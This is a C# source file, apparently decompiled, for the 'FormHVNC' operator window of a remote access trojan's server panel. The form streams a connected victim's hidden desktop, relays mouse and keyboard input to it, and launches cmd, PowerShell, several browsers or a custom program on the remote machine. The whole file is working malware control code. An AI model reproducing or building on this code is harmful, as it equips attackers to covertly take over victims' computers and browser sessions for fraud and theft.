using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormHVNC : FormMaterial
{
	public int FPS;

	public Stopwatch sw = Stopwatch.StartNew();

	private List<Keys> _keysPressed = new List<Keys>();

	public Size screen;

	public Clients client;

	public Clients parrent;

	private Point point2 = new Point(0, 0);

	private const int threshold = 15;

	private IContainer components;

	public NumericUpDown numericUpDown2;

	public MaterialSwitch materialSwitch1;

	public PictureBox pictureBox1;

	private Panel panel1;

	public Timer timer1;

	private ContextMenuStrip contextMenuStrip1;

	private ToolStripMenuItem runToolStripMenuItem;

	private ToolStripMenuItem cmdToolStripMenuItem;

	private ToolStripMenuItem powerShellToolStripMenuItem;

	private ToolStripMenuItem edgeToolStripMenuItem;

	private ToolStripMenuItem chromeToolStripMenuItem;

	private ToolStripMenuItem braweToolStripMenuItem;

	private ToolStripMenuItem yandexToolStripMenuItem;

	private ToolStripMenuItem firefoxToolStripMenuItem;

	private MaterialLabel materialLabel1;

	private ToolStripMenuItem customToolStripMenuItem;

	public FormHVNC()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormDesktop_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
		pictureBox1.MouseMove += pictureBox1_MouseMove;
		pictureBox1.MouseDown += pictureBox1_MouseDown;
		pictureBox1.MouseUp += pictureBox1_MouseUp;
		pictureBox1.MouseDoubleClick += pictureBox1_MouseDoubleClick;
		pictureBox1.MouseWheel += pictureBox1_MouseWheel;
		base.KeyPreview = true;
		pictureBox1.Focus();
		base.KeyDown += FormRemoteDesktop_KeyDown;
		base.KeyUp += FormRemoteDesktop_KeyUp;
	}

	private void ChangeScheme(object sender)
	{
		numericUpDown2.ForeColor = FormMaterial.PrimaryColor;
	}

	private void Closing1(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Disconnect();
		}
	}

	private void materialSwitch1_CheckedChanged(object sender, EventArgs e)
	{
		if (materialSwitch1.Checked)
		{
			client.Send(new object[3]
			{
				"Capture",
				true,
				(byte)numericUpDown2.Value
			});
		}
		else
		{
			client.Send(new object[2] { "Capture", false });
		}
	}

	private void numericUpDown2_ValueChanged(object sender, EventArgs e)
	{
		if (materialSwitch1.Checked)
		{
			client.Send(new object[2]
			{
				"Quality",
				(byte)numericUpDown2.Value
			});
		}
	}

	private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (materialSwitch1.Checked)
			{
				Point point = new Point(e.X * screen.Width / pictureBox1.Width, e.Y * screen.Height / pictureBox1.Height);
				byte b = 0;
				if (e.Button == MouseButtons.Left)
				{
					b = 2;
				}
				if (e.Button == MouseButtons.Right)
				{
					b = 8;
				}
				client.Send(new object[4] { "MouseClick", b, point.X, point.Y });
			}
		}
		catch
		{
		}
	}

	private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
	{
		try
		{
			if (materialSwitch1.Checked)
			{
				Point point = new Point(e.X * screen.Width / pictureBox1.Width, e.Y * screen.Height / pictureBox1.Height);
				byte b = 0;
				if (e.Button == MouseButtons.Left)
				{
					b = 4;
				}
				if (e.Button == MouseButtons.Right)
				{
					b = 16;
				}
				client.Send(new object[4] { "MouseClick", b, point.X, point.Y });
			}
		}
		catch
		{
		}
	}

	private void pictureBox1_MouseDoubleClick(object sender, MouseEventArgs e)
	{
		try
		{
			if (materialSwitch1.Checked)
			{
				Point point = new Point(e.X * screen.Width / pictureBox1.Width, e.Y * screen.Height / pictureBox1.Height);
				client.Send(new object[3] { "MouseDoubleClick", point.X, point.Y });
			}
		}
		catch
		{
		}
	}

	private void pictureBox1_MouseWheel(object sender, MouseEventArgs e)
	{
		try
		{
			if (materialSwitch1.Checked)
			{
				if (e.Delta > 0)
				{
					client.Send(new object[2] { "MouseWheel", true });
				}
				else
				{
					client.Send(new object[2] { "MouseWheel", false });
				}
			}
		}
		catch
		{
		}
	}

	private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
	{
		try
		{
			if (materialSwitch1.Checked)
			{
				Point point = new Point(e.X * screen.Width / pictureBox1.Width, e.Y * screen.Height / pictureBox1.Height);
				if (Math.Abs(point.X - point2.X) >= 15 || Math.Abs(point.Y - point2.Y) >= 15)
				{
					point2 = point;
					client.Send(new object[3] { "MouseMove", point.X, point.Y });
				}
			}
		}
		catch
		{
		}
	}

	private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
	{
		if (materialSwitch1.Checked)
		{
			if (!IsLockKey(e.KeyCode))
			{
				e.Handled = true;
			}
			if (!_keysPressed.Contains(e.KeyCode))
			{
				_keysPressed.Add(e.KeyCode);
				client.Send(new object[3]
				{
					"KeyboardClick",
					true,
					(int)e.KeyCode
				});
			}
		}
	}

	private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
	{
		if (materialSwitch1.Checked)
		{
			if (!IsLockKey(e.KeyCode))
			{
				e.Handled = true;
			}
			_keysPressed.Remove(e.KeyCode);
			client.Send(new object[3]
			{
				"KeyboardClick",
				false,
				(int)e.KeyCode
			});
		}
	}

	private bool IsLockKey(Keys key)
	{
		if ((key & Keys.Capital) != Keys.Capital && (key & Keys.NumLock) != Keys.NumLock)
		{
			return (key & Keys.Scroll) == Keys.Scroll;
		}
		return true;
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (!parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	private void cmdToolStripMenuItem_Click(object sender, EventArgs e)
	{
		client.Send(LEB128.Write(new object[2] { "Run", "Cmd" }));
	}

	private void powerShellToolStripMenuItem_Click(object sender, EventArgs e)
	{
		client.Send(LEB128.Write(new object[2] { "Run", "Powershell" }));
	}

	private void edgeToolStripMenuItem_Click(object sender, EventArgs e)
	{
		client.Send(LEB128.Write(new object[2] { "Run", "Edge" }));
	}

	private void chromeToolStripMenuItem_Click(object sender, EventArgs e)
	{
		client.Send(LEB128.Write(new object[2] { "Run", "Chrome" }));
	}

	private void braweToolStripMenuItem_Click(object sender, EventArgs e)
	{
		client.Send(LEB128.Write(new object[2] { "Run", "Brave" }));
	}

	private void yandexToolStripMenuItem_Click(object sender, EventArgs e)
	{
		client.Send(LEB128.Write(new object[2] { "Run", "Yandex" }));
	}

	private void firefoxToolStripMenuItem_Click(object sender, EventArgs e)
	{
		client.Send(LEB128.Write(new object[2] { "Run", "Firefox" }));
	}

	private void customToolStripMenuItem_Click(object sender, EventArgs e)
	{
		FormHVNCrun formHVNCrun = new FormHVNCrun();
		formHVNCrun.ShowDialog();
		if (formHVNCrun.Run)
		{
			client.Send(LEB128.Write(new object[3]
			{
				"RunCustom",
				formHVNCrun.rjTextBox1.Texts,
				formHVNCrun.rjTextBox2.Texts
			}));
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormHVNC));
		this.materialSwitch1 = new MaterialSkin.Controls.MaterialSwitch();
		this.pictureBox1 = new System.Windows.Forms.PictureBox();
		this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.runToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.cmdToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.powerShellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.edgeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.chromeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.braweToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.yandexToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.firefoxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.customToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.numericUpDown2 = new System.Windows.Forms.NumericUpDown();
		this.panel1 = new System.Windows.Forms.Panel();
		this.materialLabel1 = new MaterialSkin.Controls.MaterialLabel();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
		this.contextMenuStrip1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown2).BeginInit();
		this.panel1.SuspendLayout();
		base.SuspendLayout();
		this.materialSwitch1.AutoSize = true;
		this.materialSwitch1.Depth = 0;
		this.materialSwitch1.Enabled = false;
		this.materialSwitch1.Location = new System.Drawing.Point(3, 64);
		this.materialSwitch1.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch1.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch1.Name = "materialSwitch1";
		this.materialSwitch1.Ripple = true;
		this.materialSwitch1.Size = new System.Drawing.Size(92, 37);
		this.materialSwitch1.TabIndex = 0;
		this.materialSwitch1.Text = "Start";
		this.materialSwitch1.UseVisualStyleBackColor = true;
		this.materialSwitch1.CheckedChanged += new System.EventHandler(materialSwitch1_CheckedChanged);
		this.pictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.pictureBox1.Location = new System.Drawing.Point(6, 104);
		this.pictureBox1.Name = "pictureBox1";
		this.pictureBox1.Size = new System.Drawing.Size(813, 427);
		this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.pictureBox1.TabIndex = 4;
		this.pictureBox1.TabStop = false;
		this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.runToolStripMenuItem });
		this.contextMenuStrip1.Name = "contextMenuStrip1";
		this.contextMenuStrip1.Size = new System.Drawing.Size(181, 48);
		this.runToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[8] { this.cmdToolStripMenuItem, this.powerShellToolStripMenuItem, this.edgeToolStripMenuItem, this.chromeToolStripMenuItem, this.braweToolStripMenuItem, this.yandexToolStripMenuItem, this.firefoxToolStripMenuItem, this.customToolStripMenuItem });
		this.runToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("runToolStripMenuItem.Image");
		this.runToolStripMenuItem.Name = "runToolStripMenuItem";
		this.runToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.runToolStripMenuItem.Text = "Run";
		this.cmdToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("cmdToolStripMenuItem.Image");
		this.cmdToolStripMenuItem.Name = "cmdToolStripMenuItem";
		this.cmdToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.cmdToolStripMenuItem.Text = "Cmd";
		this.cmdToolStripMenuItem.Click += new System.EventHandler(cmdToolStripMenuItem_Click);
		this.powerShellToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("powerShellToolStripMenuItem.Image");
		this.powerShellToolStripMenuItem.Name = "powerShellToolStripMenuItem";
		this.powerShellToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.powerShellToolStripMenuItem.Text = "PowerShell";
		this.powerShellToolStripMenuItem.Click += new System.EventHandler(powerShellToolStripMenuItem_Click);
		this.edgeToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("edgeToolStripMenuItem.Image");
		this.edgeToolStripMenuItem.Name = "edgeToolStripMenuItem";
		this.edgeToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.edgeToolStripMenuItem.Text = "Edge";
		this.edgeToolStripMenuItem.Click += new System.EventHandler(edgeToolStripMenuItem_Click);
		this.chromeToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("chromeToolStripMenuItem.Image");
		this.chromeToolStripMenuItem.Name = "chromeToolStripMenuItem";
		this.chromeToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.chromeToolStripMenuItem.Text = "Chrome";
		this.chromeToolStripMenuItem.Click += new System.EventHandler(chromeToolStripMenuItem_Click);
		this.braweToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("braweToolStripMenuItem.Image");
		this.braweToolStripMenuItem.Name = "braweToolStripMenuItem";
		this.braweToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.braweToolStripMenuItem.Text = "Brave";
		this.braweToolStripMenuItem.Click += new System.EventHandler(braweToolStripMenuItem_Click);
		this.yandexToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("yandexToolStripMenuItem.Image");
		this.yandexToolStripMenuItem.Name = "yandexToolStripMenuItem";
		this.yandexToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.yandexToolStripMenuItem.Text = "Yandex";
		this.yandexToolStripMenuItem.Click += new System.EventHandler(yandexToolStripMenuItem_Click);
		this.firefoxToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("firefoxToolStripMenuItem.Image");
		this.firefoxToolStripMenuItem.Name = "firefoxToolStripMenuItem";
		this.firefoxToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.firefoxToolStripMenuItem.Text = "Firefox";
		this.firefoxToolStripMenuItem.Click += new System.EventHandler(firefoxToolStripMenuItem_Click);
		this.customToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("customToolStripMenuItem.Image");
		this.customToolStripMenuItem.Name = "customToolStripMenuItem";
		this.customToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.customToolStripMenuItem.Text = "Custom";
		this.customToolStripMenuItem.Click += new System.EventHandler(customToolStripMenuItem_Click);
		this.numericUpDown2.BackColor = System.Drawing.Color.White;
		this.numericUpDown2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.numericUpDown2.Enabled = false;
		this.numericUpDown2.ForeColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.numericUpDown2.Increment = new decimal(new int[4] { 10, 0, 0, 0 });
		this.numericUpDown2.Location = new System.Drawing.Point(112, 73);
		this.numericUpDown2.Margin = new System.Windows.Forms.Padding(2);
		this.numericUpDown2.Name = "numericUpDown2";
		this.numericUpDown2.Size = new System.Drawing.Size(42, 20);
		this.numericUpDown2.TabIndex = 19;
		this.numericUpDown2.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.numericUpDown2.UpDownAlign = System.Windows.Forms.LeftRightAlignment.Left;
		this.numericUpDown2.Value = new decimal(new int[4] { 80, 0, 0, 0 });
		this.numericUpDown2.ValueChanged += new System.EventHandler(numericUpDown2_ValueChanged);
		this.panel1.Controls.Add(this.materialLabel1);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel1.Location = new System.Drawing.Point(3, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(819, 470);
		this.panel1.TabIndex = 20;
		this.materialLabel1.AutoSize = true;
		this.materialLabel1.ContextMenuStrip = this.contextMenuStrip1;
		this.materialLabel1.Depth = 0;
		this.materialLabel1.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.materialLabel1.Location = new System.Drawing.Point(161, 10);
		this.materialLabel1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialLabel1.Name = "materialLabel1";
		this.materialLabel1.Size = new System.Drawing.Size(99, 19);
		this.materialLabel1.TabIndex = 0;
		this.materialLabel1.Text = "Context Menu";
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(825, 537);
		base.Controls.Add(this.numericUpDown2);
		base.Controls.Add(this.pictureBox1);
		base.Controls.Add(this.materialSwitch1);
		base.Controls.Add(this.panel1);
		base.DrawerUseColors = true;
		base.Name = "FormHVNC";
		this.Text = "HVNC";
		base.Load += new System.EventHandler(FormDesktop_Load);
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
		this.contextMenuStrip1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.numericUpDown2).EndInit();
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
